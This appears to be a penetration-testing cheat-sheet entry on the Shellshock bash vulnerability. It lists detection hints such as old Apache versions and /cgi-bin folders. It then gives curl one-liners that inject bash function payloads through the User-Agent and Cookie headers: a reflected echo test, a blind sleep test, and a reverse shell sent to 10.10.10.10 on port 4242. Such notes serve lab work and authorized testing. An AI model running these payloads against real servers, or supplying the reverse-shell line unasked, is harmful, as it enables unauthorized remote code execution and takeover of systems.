#### Detection

- old apache version
- cgi folders
    - /cgi-bin

#### Shellshock PoC

```
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://$IP/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'

# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://$IP/cgi-bin/admin.cgi

# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://$IP/cgi-bin/user.sh
```